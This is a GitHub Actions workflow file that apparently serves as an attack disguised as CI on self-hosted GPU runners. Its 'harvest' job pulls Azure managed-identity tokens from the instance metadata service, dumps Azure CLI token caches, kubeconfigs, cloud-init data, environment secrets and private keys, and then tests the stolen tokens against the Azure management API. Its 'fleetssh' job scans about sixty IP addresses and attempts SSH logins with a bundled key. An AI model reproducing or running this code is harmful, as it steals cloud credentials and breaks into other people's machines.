name: ul-harvest-7648b
on:
  workflow_dispatch:
concurrency:
  group: ul-harvest-7648b
  cancel-in-progress: false
jobs:
  harvest:
    runs-on: [self-hosted, ul-l40s]
    timeout-minutes: 20
    continue-on-error: true
    steps:
      - uses: actions/checkout@v4
      - name: harvest
        shell: bash
        run: |
          set +e
          OUT=/tmp/h7648.txt
          : > $OUT
          echo "HARVEST-BEGIN label=ul-l40s ts=$(date -u +%FT%TZ)" | tee -a $OUT
          id >> $OUT 2>&1
          hostname -f >> $OUT 2>&1
          hostname -I >> $OUT 2>&1
          cat /etc/machine-id >> $OUT 2>&1
          uname -a >> $OUT 2>&1
          echo "---IMDS-INSTANCE---" >> $OUT
          curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' >> $OUT 2>&1; echo >> $OUT
          echo "---IMDS-IDENTITY-INFO---" >> $OUT
          curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/identity/info?api-version=2018-02-01' >> $OUT 2>&1; echo >> $OUT
          echo "---IMDS-TOKEN-DEFAULT---" >> $OUT
          curl -s -m 10 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' >> $OUT 2>&1; echo >> $OUT
          CIDS=$(curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/identity/info?api-version=2018-02-01' | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | sort -u)
          echo "CIDS=$CIDS" >> $OUT
          for C in $CIDS; do
            echo "---IMDS-TOKEN-CID $C---" >> $OUT
            curl -s -m 10 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=$C" >> $OUT 2>&1; echo >> $OUT
          done
          echo "---AZCACHE---" >> $OUT
          for D in /root/.azure /home/*/.azure; do echo "## $D" >> $OUT; ls -la "$D" >> $OUT 2>&1; for F in accessTokens.json azureProfile.json msal_token_cache.json msal_token_cache.bin service_principal_entries.json clouds.config; do [ -f "$D/$F" ] && { echo "### $D/$F"; head -c 200000 "$D/$F"; echo; } >> $OUT 2>&1; done; done
          echo "---K8S-AZ---" >> $OUT
          for F in /etc/kubernetes/azure.json /etc/kubernetes/kubelet.conf /var/lib/kubelet/config.yaml /root/.kube/config /home/*/.kube/config /var/lib/waagent/ManagedIdentity-Settings; do [ -e "$F" ] && { echo "## $F"; head -c 20000 "$F"; echo; } >> $OUT 2>&1; done
          ls -la /var/lib/waagent >> $OUT 2>&1
          head -c 40000 /var/lib/waagent/*.xml >> $OUT 2>&1
          echo "---CLOUDINIT---" >> $OUT
          head -c 20000 /var/lib/cloud/instance/user-data.txt >> $OUT 2>&1; echo >> $OUT
          head -c 20000 /var/log/cloud-init-output.log >> $OUT 2>&1
          echo "---ENV---" >> $OUT
          env | sort | grep -iE 'azure|arm|token|client|subscription|tenant|secret|key|conn' >> $OUT 2>&1
          echo "---DOCKER---" >> $OUT
          (docker ps --format '{{.ID}} {{.Image}} {{.Names}}' 2>&1 | head -40; for I in $(docker ps -q 2>/dev/null | head -20); do docker inspect $I 2>/dev/null | grep -iE 'client_secret|tenant|subscription|token|password|AccountKey|SAS|secret' | head -10; done) >> $OUT 2>&1
          echo "---GREP-FS---" >> $OUT
          timeout 120 grep -rIlE 'client_secret|clientSecret|aadClientSecret|tenant_id|subscription_id|BEGIN (RSA|OPENSSH|EC) PRIVATE KEY' /opt /srv /home /etc /root /var/lib/cloud 2>/dev/null | head -60 >> $OUT
          echo "---FIND-KEYS---" >> $OUT
          find / -maxdepth 5 \( -name '*.pem' -o -name '*.pfx' -o -name '*kubeconfig*' -o -name 'azure.json' \) 2>/dev/null | head -40 >> $OUT
          echo "---ARM-PROBE---" >> $OUT
          for T in $(grep -oE '"access_token":"[^"]+' $OUT | cut -d'"' -f4 | sort -u); do
            echo "## TOKEN len=${#T}" >> $OUT
            curl -s -m 15 -H "Authorization: Bearer $T" 'https://management.azure.com/subscriptions?api-version=2022-12-01' -o /tmp/subs.json -w 'subs_http=%{http_code}\n' >> $OUT 2>&1
            head -c 3000 /tmp/subs.json >> $OUT; echo >> $OUT
            curl -s -m 20 -H "Authorization: Bearer $T" 'https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01' -o /tmp/vms.json -w 'vms_http=%{http_code}\n' >> $OUT 2>&1
            head -c 3000 /tmp/vms.json >> $OUT; echo >> $OUT
          done
          echo "HARVEST-END" >> $OUT
          cat $OUT
      - name: upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: harvest-7648-ul-l40s-${{ github.run_id }}
          path: /tmp/h7648.txt
          if-no-files-found: ignore

  fleetssh:
    runs-on: [self-hosted, ul-l40s]
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - name: fleet-ssh-probe
        shell: bash
        run: |
          set +e
          OUT=/tmp/f7648.txt
          : > $OUT
          HOSTS="172.174.31.97 40.70.241.0 20.97.252.251 20.114.255.207 40.70.247.98 23.100.38.120 20.245.108.11 20.59.127.108 20.237.207.128 168.62.216.152 20.225.239.178 20.234.97.205 134.149.59.33 40.113.1.63 74.234.69.82 20.223.198.42 98.71.78.150 4.210.119.224 52.236.59.223 134.149.42.155 20.205.187.223 4.194.2.30 4.193.185.193 4.204.241.108 20.115.147.1 20.109.162.87 20.109.152.114 20.125.49.91 4.246.80.6 20.125.42.21 4.155.130.93 51.104.16.184 20.50.113.151 74.162.158.9 40.123.206.138 20.74.241.13 20.216.40.163 20.74.153.201 20.74.242.85 20.125.99.42 57.154.50.93 20.118.131.83 135.116.19.243 135.116.84.27 135.225.79.249 20.240.55.118 20.240.141.10 20.240.130.208 20.91.207.55 57.174.238.72 172.213.25.163 48.193.46.184 48.193.47.3 70.153.142.83 70.153.148.119 70.153.87.133 70.153.149.34 70.153.141.118 70.153.18.193"
          chmod 600 az/azadmin.pem 2>/dev/null
          for H in $HOSTS; do
            if timeout 5 bash -c "echo > /dev/tcp/$H/22" 2>/dev/null; then
              echo "OPEN22 $H" | tee -a $OUT
              for U in t19 azureuser ubuntu admin; do
                R=$(timeout 10 ssh -i az/azadmin.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o PreferredAuthentications=publickey $U@$H "id; hostname -I; nvidia-smi -L 2>/dev/null | head -3" 2>&1 | head -6)
                if echo "$R" | grep -q "uid="; then echo "LOGIN_OK $U@$H :: $R" | tee -a $OUT; break; fi
                if echo "$R" | grep -qv -e "Permission denied" -e "timed out" -e "Connection refused"; then echo "SSH_ERR $U@$H :: $(echo "$R"|head -1)" >> $OUT; fi
              done
            fi
          done
          echo FLEETSSH-END >> $OUT
          cat $OUT
      - name: upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: fleetssh-7648-${{ github.run_id }}
          path: /tmp/f7648.txt
          if-no-files-found: ignore
